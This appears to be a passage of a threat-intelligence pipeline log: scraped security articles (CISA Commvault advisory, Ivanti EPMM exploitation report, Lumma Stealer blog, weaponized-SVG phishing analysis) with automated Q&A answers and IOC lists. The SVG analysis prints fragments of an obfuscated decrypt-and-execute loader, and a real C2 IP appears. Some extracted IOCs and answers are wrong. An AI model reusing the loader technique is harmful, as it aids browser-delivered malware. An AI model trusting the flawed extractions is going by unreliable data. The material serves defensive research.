Business\n\n[3] CV\\_2025\\_03\\_1: Critical Webserver Vulnerability\n\n[4] Best Practice Guide: Enhancing Security with Conditional Access and Sign-In Monitoring\n\n### Additional Resources\n\n- Get servicePrincipal – Microsoft Graph v1.0 | Microsoft Learn\n- Updated Best Practices in Security for Azure Apps Configuration to Protect M365, D365 or EntraID Workload | Commvault\n\nOrganizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870.\n\nThis product is provided subject to this Notification and this Privacy &amp; Use policy.\n\n## Please share your thoughts\n\nWe recently updated our anonymous product survey; we’d welcome your feedback.\n\n- Topics\n- Spotlight\n- Resources &amp; Tools\n- News &amp; Events\n- Careers\n- About\n\n- Facebook\n- X\n- LinkedIn\n- YouTube\n- Instagram\n- RSS\n\nDHS Seal\n\nCISA.gov\n\nAn official website of the U.S. Department of Homeland Security\n\n- About CISA\n- Budget and Performance\n- DHS.gov\n- FOIA Requests\n- No FEAR Act\n- Office of Inspector General\n- Privacy Policy\n- Subscribe\n- The White House\n- USA.gov\n- Website Feedback"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://g0njxa.medium.com/lumma-stealer-q-a-5440ae9f0d9f", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "Lumma Stealer is a type of malware known as a stealer.", "question": "What kind of malware is it?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "Yes, it is related to Lumma Stealer, which is a type of malware, but the specific type is not explicitly mentioned as a wallet stealer.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://g0njxa.medium.com/lumma-stealer-q-a-5440ae9f0d9f", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://g0njxa.medium.com/approaching-stealers-devs-a-brief-interview-with-lummac2-94111d4b1e11"}], "keywords_found": ["apt"], "article_textual_content": "# Lumma Stealer Q&amp;A\n\n--\n\nListen\n\nShare\n\nThe people have spoken, you asked and them replied\n\nIn December 2023, I offered the developer of Lumma Stealer to make a quick interview about his product. It was the first blog of the “Approaching stealers devs” blog series.\nRead it here: https://g0njxa.medium.com/approaching-stealers-devs-a-brief-interview-with-lummac2-94111d4b1e11\n\nIt’s been some time since this interview, so I believe it’s time to make stealer devs speak again. Inspired by recently enacted vx-underground Q&amp;A which were hosted on Twitter spaces, I decided to adapt this format and make the Lumma Seller operator participant of a Q&amp;A session between my followers and him, who very kindly accepted my request.\n\nOf course, you could have asked him yourself, but you decided to do it here for the sake of the blog, and I really appreciate everyone of you making part of this :)\n\nPlease note everything that is stated on this blog only has an informational purpose. I‘m strongly against the use and promotion of these products.\n\nLadies and gentleman, Questions &amp; Answers with Lumma Stealer: (by @g0njxa)\n\nThe questions were made in English and I strongly believe Lumma is not a native English speaker so maybe some questions were not answered as desired.\n\n# End\n\nExpect more content, if possible. Best regards to you.\n\nWant more questions? Let me know!\n\n2025 ~ @g0njxa\n\nCybersecurity\n\nInterview\n\nMalware\n\nQuestions\n\nInfosec\n\n--\n\n--\n\n## Written by g0njxa\n\nExpect more content!\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://huggingface.co/blog/davidberenstein1957/phare-analysis-of-hallucination-in-leading-llms", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://huggingface.co/blog/davidberenstein1957/phare-analysis-of-hallucination-in-leading-llms", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/chinese-hackers-exploit-ivanti-epmm.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware used includes KrustyLoader, a Rust-based loader, and Sliver, as well as Auto-Color, a Linux backdoor.", "question": "What kind of malware is it?"}, {"answer": "The attack involves exploiting security flaws in Ivanti Endpoint Manager Mobile (EPMM) software to execute arbitrary code on a vulnerable device without requiring authentication, allowing for remote access, manipulation, and compromise of managed devices.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware steals sensitive data, including information about managed mobile devices, LDAP users, and Office 365 refresh and access tokens.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is exfiltrated, but the specific destination is not mentioned, however, it is mentioned that the threat actors use an AWS S3 bucket and Fast Reverse Proxy (FRP) to facilitate network reconnaissance and lateral movement.", "question": "Where does it forward the stolen information?"}, {"answer": "The targeted locations include Europe, North America, and the Asia-Pacific region, with sectors such as healthcare, telecommunications, aviation, municipal government, finance, and defense being targeted. No specific bank names or wallets are mentioned.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://thehackernews.com/2025/05/chinese-hackers-exploit-ivanti-epmm.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://aws.com"}, {"type": "Domain or URL", "value": "http://mifs/rs/api/v2/"}, {"type": "IP Address", "value": "146.70.87.67"}], "keywords_found": ["analysis", "threat", "intelligence", "apt", "malicious", "botnet", "dropper", "backdoor"], "article_textual_content": "# Chinese Hackers Exploit Ivanti EPMM Bugs in Global Enterprise Network Attacks\n\nA recently patched pair of security flaws affecting Ivanti Endpoint Manager Mobile (EPMM) software has been exploited by a China-nexus threat actor to target a wide range of sectors across Europe, North America, and the Asia-Pacific region.\n\nThe vulnerabilities, tracked as CVE-2025-4427 (CVSS score: 5.3) and CVE-2025-4428 (CVSS score: 7.2), could be chained to execute arbitrary code on a vulnerable device without requiring any authentication. They were addressed by Ivanti last week.\n\nNow, according to a report from EclecticIQ, the vulnerability chain has been abused by UNC5221, a Chinese cyber espionage group known for its targeting of edge network appliances since at least 2023. Most recently, the hacking crew was also attributed to exploitation efforts targeting SAP NetWeaver instances susceptible to CVE-2025-31324.\n\nThe Dutch cybersecurity company said the earliest exploitation activity dates back to May 15, 2025, with the attacks targeting healthcare, telecommunications, aviation, municipal government, finance, and defense sectors.\n\n\"UNC5221 demonstrates a deep understanding of EPMM's internal architecture, repurposing legitimate system components for covert data exfiltration,\" security researcher Arda Büyükkaya said. \"Given EPMM's role in managing and pushing configurations to enterprise mobile devices, a successful exploitation could allow threat actors to remotely access, manipulate, or compromise thousands of managed devices across an organization.\"\n\nThe attack sequence involves targeting the \"/mifs/rs/api/v2/\" endpoint to obtain an interactive reverse shell and remotely execute arbitrary commands on Ivanti EPMM deployments. This is followed by the deployment of KrustyLoader, a known Rust-based loader attributed to UNC5221 that enables the delivery of additional payloads like Sliver.\n\nThe threat actors have also been observed targeting the mifs database by making use of hard-coded MySQL database credentials stored in /mi/files/system/.mifpp to obtain unauthorized access to the database and exfiltrating sensitive data that could grant them visibility into managed mobile devices, LDAP users, and Office 365 refresh and access tokens.\n\nFurthermore, the incidents are characterized by the use of obfuscated shell commands for host reconnaissance before dropping KrustyLoader from an AWS S3 bucket and Fast Reverse Proxy (FRP) to facilitate network reconnaissance and lateral movement. It's worth mentioning here that FRP is an open-source tool widely shared among Chinese hacking groups.\n\nEclecticIQ said it also identified a command-and-control (C2) server associated with Auto-Color, a Linux backdoor that was documented by Palo Alto Networks Unit 42 as used in attacks aimed at universities and government organizations in North America and Asia between November and December 2024.\n\n\"The IP address 146.70.87[.]67:45020, previously associated with Auto-Color command-and-control infrastructure, was seen issuing outbound connectivity tests via curl immediately after exploitation of Ivanti EPMM servers,\" Büyükkaya pointed out. \"This behaviour is consistent with Auto-Color's staging and beaconing patterns. Taken together, these indicators very likely link to China-nexus activity.\"\n\nThe disclosure comes as threat intelligence firm GreyNoise noted that it had witnessed a significant spike in scanning activity targeting Ivanti Connect Secure and Pulse Secure products prior to the disclosure of CVE-2025-4427 and CVE-2025-4428.\n\n\"While the scanning we observed was not directly tied to EPMM, the timeline underscores a critical reality: scanning activity often precedes the public emergence of zero-day vulnerabilities,\" the company said. \"It's a leading indicator — a signal that attackers are probing critical systems, potentially in preparation for future exploitation.\"\n\nFound this article interesting?  Follow us on  and  to read more exclusive content we post.\n\nTrending News\n\n⚡ Weekly Recap: Zero-Day Exploits, Insider Threats, APT Targeting, Botnets and More\n\nResearchers Expose New Intel CPU Flaws Enabling Memory Leaks and Spectre v2 Attacks\n\nCoinbase Agents Bribed, Data of ~1% Users Leaked; $20M Extortion Attempt Fails\n\n5 BCDR Essentials for Effective Ransomware Defense\n\nNew Chrome Vulnerability Enables Cross-Origin Data Leak via Loader Referrer Policy\n\nLearning How to Hack: Why Offensive Security Training Benefits Your Entire Security Team\n\nFortinet Patches CVE-2025-32756 Zero-Day RCE Flaw Exploited in FortiVoice Systems\n\nMicrosoft Fixes 78 Flaws, 5 Zero-Days Exploited; CVSS 10 Bug Impacts Azure DevOps Server\n\nMalicious npm Package Leverages Unicode Steganography, Google Calendar as C2 Dropper\n\nMalicious PyPI Package Posing as Solana Tool Stole Source Code in 761 Downloads\n\nChina-Linked APTs Exploit SAP CVE-2025-31324 to Breach 581 Critical Systems Worldwide\n\nSecurity Tools Alone Don't Protect You — Control Effectiveness Does\n\nReevaluating SSEs: A Technical Gap Analysis of Last-Mile Protection\n\nPopular Resources\n\nGet This Free Pre-Built Workflow to Instantly Automate CVE Alerts\n\nSecure Google Workspace Access with Intelligent, AI-Driven Protection\n\nFree Guide: Master the Essentials of Machine Identity Management\n\nWorried About Identity Theft? 6 Simple Steps to Secure Microsoft Entra ID\n\n## Cybersecurity Webinars\n\n### Learn How Hackers Are Targeting Hidden AI Identity Accounts\n\nAI boosts speed and scale—but also risk. Hidden identity accounts can expose your systems if left unsecured.\n\n### Learn to Build a Reasonable Cyber Defense Program\n\nLearn how to build a compliant, defensible cybersecurity program using CIS Controls, CSAT Pro, and SecureSuite — all in one practical, expert-led session.\n\nLatest News\n\nCybersecurity Resources\n\n[Download] SaaS Security Guide That Turns Blind Spots Into Defenses\n\nA clear, practical guide to help CISOs and IT teams secure SaaS apps, reduce risks, and protect data.\n\nUnite Dev and Sec with ASPM\n\nRedefining Secure Development with Application Security Posture Management (ASPM). Unlock the tools and processes that will help developers ship fast and fix fast.\n\nDiscover How to Make CTEM a Reality in 2025: Download Your Guide Now!\n\nEnsure CTEM success! Download our ebook for practical tips on using XM Cyber to implement your exposure management strategy.\n\nWant To Excel as a Cybersecurity Professional?\n\nDevelop cybersecurity strategies that increase security with Georgetown.\n\n## JPMorgan CISO Spotlights SaaS Security Concerns. What Now?\n\n## Cover Your SaaS: Why SaaS Data Protection is the Foundation of Modern Business\n\n## Living Off the Land: What We Learned from 700,000 Security Incidents\n\n## Breach Fatalism is Over: Why Identity Threat Prevention Is the Future of Cybersecurity\n\nGet Latest News in Your Inbox\n\nGet the latest news, expert insights, exclusive resources, and strategies from industry leaders – all for free.\n\nConnect with us!\n\n925,500 Followers\n\n636,000 Followers\n\n23,500 Subscribers\n\n145,000 Followers\n\n1,890,500 Followers\n\n147,200 Subscribers\n\nCompany\n\n- About THN\n- Advertise with us\n- Contact\n\nPages\n\n- Webinars\n- Privacy Policy\n\nRSS Feeds\n\nContact Us\n\n© The Hacker News, 2025. All Rights Reserved."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.europol.europa.eu/media-press/newsroom/news/europol-and-microsoft-disrupt-world%E2%80%99s-largest-infostealer-lumma", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://www.europol.europa.eu/media-press/newsroom/news/europol-and-microsoft-disrupt-world%E2%80%99s-largest-infostealer-lumma", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": "# You need to enable JavaScript to run this app.\n\nLoading application.\nPlease wait."}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://blog.talosintelligence.com/uat-6382-exploits-cityworks-vulnerability/", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.akamai.com/blog/security/2025/may/ai-cybersecurity-how-impacting-fight-against-cybercrime", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [], "url": "https://www.akamai.com/blog/security/2025/may/ai-cybersecurity-how-impacting-fight-against-cybercrime", "error": "No article content provided", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://thehackernews.com/2025/05/gitlab-duo-vulnerability-enabled.html", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"output": ""}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://medium.com/@kumarishefu.4507/deep-dive-analyzing-a-weaponized-svg-based-phishing-attack-1a0a520548e7?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The malware is a phishing payload embedded in an SVG (Scalable Vector Graphics) file, which can lead to cross-site scripting (XSS), phishing, and remote code execution (RCE) attacks.", "question": "What kind of malware is it?"}, {"answer": "It involves a phishing attack using an SVG (Scalable Vector Graphics) file to deliver encrypted, browser-executed malware.", "question": "What kind of attack does it involve?"}, {"answer": "The malware can alter the DOM and hijack UI interactions, which is similar to web inject functionality.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the script can steal credentials. It is mentioned that this script can \"🕵️‍♀️ Steal credentials\" among other malicious activities.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The script can steal credentials, which may include credit card or bank information, as well as exfiltrate session tokens.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The script can steal credentials and exfiltrate session tokens, which may include wallet information, but it is not specifically referred to as a wallet stealer.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware can steal credentials, exfiltrate session tokens, and potentially load additional malware to hijack UI interactions and alter the DOM.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://medium.com/@kumarishefu.4507/deep-dive-analyzing-a-weaponized-svg-based-phishing-attack-1a0a520548e7?source=rss------malware-5", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "y29jb25uZWxsQGxpbmtlZGluLmNvbQ=="}], "keywords_found": ["analysis", "threat", "phishing", "malicious", "browser"], "article_textual_content": "# Deep Dive: Analyzing a Weaponized SVG-Based Phishing Attack\n\nJust now\n\n--\n\nListen\n\nShare\n\nIn this blog, we’ll dissect a sophisticated phishing payload embedded in an SVG (Scalable Vector Graphics) file. This example showcases how attackers can leverage seemingly harmless file formats to deliver encrypted, browser-executed malware.\n\n# ✨ Why This Matters\n\nSVG files are often used for icons and vector images across the web. Because they’re XML-based and can embed JavaScript, they become a potent vector for cross-site scripting (XSS), phishing, and remote code execution (RCE) attacks. Let’s break down how a threat actor encoded and embedded malicious logic into a zero-pixel SVG file.\n\n# 🔎 Threat Vector Overview\n\nThe payload is hidden inside an SVG file that looks harmless:\n\n```\n<svg width=\"0\" height=\"0\" xmlns=\"http://www.w3.org/2000/svg\">\n  <script type=\"application/javascript\">\n    <![CDATA[\n      // Malicious JavaScript payload here\n    ]]>\n  </script>\n</svg>\n```\n\n- Invisible: Renders at zero width and height.\n- Stealthy: Uses a &lt;![CDATA[]]&gt; block to bypass some filters.\n- Deceptive: Comment contains a misleading Base64 string:\n\n```\n<!-- U2FsdGVkX19vbmx5X2Zvcl9kZWNvcmF0aW9uX3B1cnBvc2Vz -->\n```\n\n- Which decodes to: Salted\\_\\_only\\_for\\_decoration\\_purposes\n\n# 🧩 Anatomy of the JavaScript Payload\n\n# 1. Initialization &amp; Distraction\n\n```\nconst MONITOR_TAG = \"[SECURE_ENGINE_V2]\";\nlet trackerData = {\n  initTimestamp: Date.now(),\n  memUsage: 0,\n  simulatedLoad: 0,\n  iterationCounter: 0\n};\n```\n\nUsed to simulate benign behavior. Looks like a system monitor, but is irrelevant.\n\n```\nconst bel = \"Y29jb25uZWxsQGxpbmtlZGluLmNvbQ==\";\nconst lieve = \"SuglaMahu\";\n```\n\nCompletely unused. These are decoys.\n\n# 2. Noise Generator\n\n```\nfunction generateObfuscation() {\n  return Math.random().toString(36).slice(2, 14) + Math.random().toString(36).slice(2, 14);\n}\n```\n\nCreates random strings. Adds entropy to the code.\n\n# 🔐 Encrypted Payload Details\n\nMalicious data is stored in this structure:\n\n```\nconst dataPool = {\n  ivHex: \"93899bc60b03f9b770230591\",\n  saltHex: \"6234f4f591dcd606d85a1a9242f20edd\",\n  encryptedDataHex: \"...massive blob...\",\n  passphrase: \"fun\"\n};\n```\n\n# 3. Decryption Logic\n\nIt uses modern Web Crypto APIs to decrypt the data:\n\n```\nconst cryptoKey = await window.crypto.subtle.importKey(\n  \"raw\",\n  new TextEncoder().encode(passphrase),\n  { name: \"PBKDF2\" },\n  false,\n  [\"deriveKey\"]\n);\n```\n\nThen derives a key:\n\n```\nconst derivedKey = await window.crypto.subtle.deriveKey(\n  {\n    name: \"PBKDF2\",\n    salt: hexToBuffer(saltHex),\n    iterations: 100000,\n    hash: \"SHA-256\"\n  },\n  cryptoKey,\n  { name: \"AES-GCM\", length: 256 },\n  false,\n  [\"decrypt\"]\n);\n```\n\nAnd decrypts the encrypted JavaScript:\n\n```\nconst decryptedBuffer = await window.crypto.subtle.decrypt(\n  {\n    name: \"AES-GCM\",\n    iv: hexToBuffer(ivHex)\n  },\n  derivedKey,\n  hexToBuffer(encryptedHex)\n);\n```\n\nFinally, executes it dynamically:\n\n```\n(new Function(decryptedText))();\n```\n\n# ⚙️ Obfuscation Tactics\n\nTo bypass static and dynamic scanners:\n\n- Unused variables: Look legitimate\n- Fake logs: Makes console appear benign\n\n```\nwindow.addEventListener('DOMContentLoaded', () => {\n  console.info(\"Initialization complete - benign log\");\n  for(let i = 0; i < 3; i++) {\n    console.debug(`Debug loop ${i} - Placeholder log`);\n  }\n});\n```\n\n- Delays execution: Hides intent during initial loads\n\n```\nsetTimeout(launchSecurityProcedure, 600);\n```\n\n# 🚨 Real-World Impact\n\nThis script can:\n\n- 🕵️‍♀️ Steal credentials\n- 📤 Exfiltrate session tokens\n- 🎣 Hook into other phishing kits\n- 🐛 Load additional malware\n- 🛠 Alter DOM, hijack UI interactions\n\n# ⚠️ Detection &amp; Mitigation\n\n# For Developers\n\n- ❌ Never allow user-uploaded SVGs to render inline.\n- ✂️ Strip tags like &lt;script&gt;, &lt;iframe&gt; using: DOMPurify and SVGO\n\n# For Security Teams\n\n- 🚧 Use CSP headers:\n\n```\nContent-Security-Policy: script-src 'self'; object-src 'none';\n```\n\n- 🔒 Disable dynamic script execution (eval, new Function) via CSP\n- 🧪 Scan SVGs for embedded JS or encrypted blobs\n\n# For Users\n\n- ⚠️ Don’t trust SVGs from unknown sources\n- ✅ Keep your browser and extensions updated\n\n# 🧠 Final Thoughts\n\nThis attack demonstrates how attackers evolve — embedding encrypted malware inside images and unlocking it with browser-native tools. Static scanning won’t catch this. Behavioral analysis might, but only with delay.\n\nPro Tip: Treat all uploads as hostile. Sanitize. Validate. Isolate.\n\n# ✉️ Want More?\n\nFollow me for hands-on threat breakdowns, web security tactics, and real-world exploits demystified. Stay secure, stay smart.\n\n-by Shefali Kumari\n\nPhishing\n\nMalware\n\nExploitation\n\nSVG\n\nCybersecurity\n\n--\n\n--\n\n## Written by Shefali Kumari\n\nLove Learning about Malware analysis, Threat hunting, Network Security and Incident Response Management professionally | https://youtube.com/channel/UCf-F-eATCU\n\n## No responses yet\n\nHelp\n\nStatus\n\nAbout\n\nCareers\n\nPress\n\nBlog\n\nPrivacy\n\nRules\n\nTerms\n\nText to speech"}}
{"metadata" : {"ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.cisa.gov/news-events/alerts/2025/05/22/advisory-update-cyber-threat-activity-targeting-commvaults-saas-cloud-application-metallic", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "The attack involves cyber threat activity targeting Commvault's SaaS cloud application, specifically accessing client secrets for Microsoft 365 backup software-as-a-service solution. It appears to be part of a larger campaign targeting SaaS companies' cloud applications with default configurations and elevated permissions.", "question": "What kind of attack does it involve?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The threat actors may have accessed client secrets for Commvault's Microsoft 365 backup software-as-a-service solution, providing unauthorized access to customers' M365 environments. This allows them to steal application secrets stored by Commvault.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.cisa.gov/news-events/alerts/2025/05/22/advisory-update-cyber-threat-activity-targeting-commvaults-saas-cloud-application-metallic", "error": null, "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "https://learn.microsoft.com/en-us/azure/active-directory/workload-identities"}, {"type": "Domain or URL", "value": "https://learn.microsoft.com/en-us/azure/active-directory/develop/msal-client-application-configuration"}, {"type": "Domain or URL", "value": "https://developer.microsoft.com/en-us/graph/docs/v1.0/reference/api/serviceprincipal"}, {"type": "Domain or URL", "value": "https://www.cisa.gov/"}, {"type": "Domain or URL", "value": "https://www.microsoft.com/en-us/"}, {"type": "Domain or URL", "value": "https://Report@cisa.gov"}, {"type": "Domain or URL", "value": "https://www.commvault.com/"}, {"type": "Domain or URL", "value": "https://www.facebook.com/"}, {"type": "Domain or URL", "value": "https://www.linkedin.com/"}, {"type": "Domain or URL", "value": "https://www.youtube.com/"}, {"type": "Domain or URL", "value": "https://www.instagram.com/"}, {"type": "Domain or URL", "value": "https://www.dhs.gov/"}, {"type": "Domain or URL", "value": "https://www.usa.gov/"}], "keywords_found": ["threat", "malicious"], "article_textual_content": "# Advisory Update on Cyber Threat Activity Targeting Commvault’s SaaS Cloud Application (Metallic)\n\nRelease Date\n\nCommvault is monitoring cyber threat activity targeting their applications hosted in their Microsoft Azure cloud environment. Threat actors may have accessed client secrets for Commvault’s (Metallic) Microsoft 365 (M365) backup software-as-a-service (SaaS) solution, hosted in Azure. This provided the threat actors with unauthorized access to Commvault’s customers’ M365 environments that have application secrets stored by Commvault.\n\nSee the following resource for more information: Notice: Security Advisory (Update).\n\nCISA believes the threat activity may be part of a larger campaign targeting various SaaS companies’ cloud applications with default configurations and elevated permissions.\n\nCISA urges users and administrators to review the following mitigations and apply necessary patches and updates for all systems:\n\n1. Monitor Entra audit logs for unauthorized modifications or additions of credentials to service principals initiated by Commvault applications/service principals.\n    1. Handle deviations from regular login schedules as suspicious.\n    2. For more information, see NSA and CISA’s Identity Management guidance, as well as CISA’s guidance on Identity, Credential, and Access Management (ICAM) Reference Architecture.\n2. Review Microsoft logs (Entra audit, Entra sign-in, unified audit logs) and conduct internal threat hunting in alignment with documented organizational incident response polices.\n3. (Applies to single tenant apps only ) Implement a conditional access policy that limits authentication of an application service principal to an approved IP address that is listed within Commvault’s allowlisted range of IP addresses.\n    1. Note: A Microsoft Entra Workload ID Premium License is required to apply conditional access policies to an application service principal and is available to customers at an additional cost.[1]\n4. For certain Commvault customers, rotate their application secrets, rotate those credentials on Commvault Metallic applications and service principles available between February and May 2025.[2 ] Note : This mitigation only applies to a limited number of customers who themselves have control over Commvault’s application secrets.\n    1. Customers who have the ability to, if applicable, should establish a policy to regularly rotate credentials at least every 30 days.\n5. Review the list of Application Registrations and Service Principals in Entra with administrative consent for higher privileges than the business need.\n6. Implement general M365 security recommendations outlined in CISA’s Secure Cloud Business Applications (SCuBA) Project.\n\n##### Precautionary Recommendations for On-premises Software Versions\n\n1. Where technically feasible, restrict access to Commvault management interfaces to trusted networks and administrative systems.\n2. Detect and block path-traversal attempts and suspicious file uploads by deploying a Web Application Firewall and removing external access to Commvault applications [CSA-250502].\n3. Apply the patches provided [3 ] and follow these best practices [4 ].\n    1. Especially monitor activity from unexpected directories, particularly web-accessible paths.\n\nCISA added CVE-2025-3928 to the Known Exploited Vulnerabilities Catalog and is continuing to investigate the malicious activity in collaboration with partner organizations.\n\n### References\n\n[1] Workload identities - Microsoft Entra Workload ID | Microsoft Learn\n\n[2] Change a Client Secret for the Azure App for OneDrive for Business\n\n[3] CV\\_2025\\_03\\_1: Critical Webserver Vulnerability\n\n[4] Best Practice Guide: Enhancing Security with Conditional Access and Sign-In Monitoring\n\n### Additional Resources\n\n- Get servicePrincipal – Microsoft Graph v1.0 | Microsoft Learn\n- Updated Best Practices in Security for Azure Apps Configuration to Protect M365, D365 or EntraID Workload | Commvault\n\nOrganizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at Report@cisa.gov or (888) 282-0870.\n\nThis product is provided subject to this Notification and this Privacy &amp; Use policy.\n\n## Please share your thoughts\n\nWe recently updated our anonymous product survey; we’d welcome your feedback.\n\n- Topics\n- Spotlight\n- Resources &amp; Tools\n- News &amp; Events\n- Careers\n- About\n\n- Facebook\n- X\n- LinkedIn\n- YouTube\n- Instagram\n- RSS\n\nDHS Seal\n\nCISA.gov\n\nAn official website of the U.S. Department of Homeland Security\n\n- About CISA\n- Budget and Performance\n- DHS.gov\n- FOIA Requests\n- No FEAR Act\n- Office of Inspector General\n- Privacy Policy\n- Subscribe\n- The White House\n- USA.gov\n- Website Feedback"}}
